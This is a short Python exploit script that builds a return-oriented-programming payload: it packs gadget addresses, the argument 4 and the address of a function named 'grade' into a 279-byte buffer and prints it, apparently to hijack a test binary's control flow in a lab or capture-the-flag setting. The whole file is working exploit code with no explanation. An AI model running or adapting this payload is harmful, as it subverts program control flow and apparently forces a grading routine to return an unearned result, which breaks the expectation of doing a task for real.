import sys, struct

ret_gadget = 0x4015c1
pop_rdi_gadget = 0x4018a3
grade_addr = 0x401677
buf = bytearray(b"\x00" * 279)
buf[0:8] = struct.pack('<Q', ret_gadget)
buf[8:16] = struct.pack('<Q', pop_rdi_gadget)
buf[16:24] = struct.pack('<Q', 4)
buf[24:32] = struct.pack('<Q', grade_addr)
buf[0x100:0x104] = struct.pack('<I', 0xa8)

sys.stdout.buffer.write(buf + b"\n")
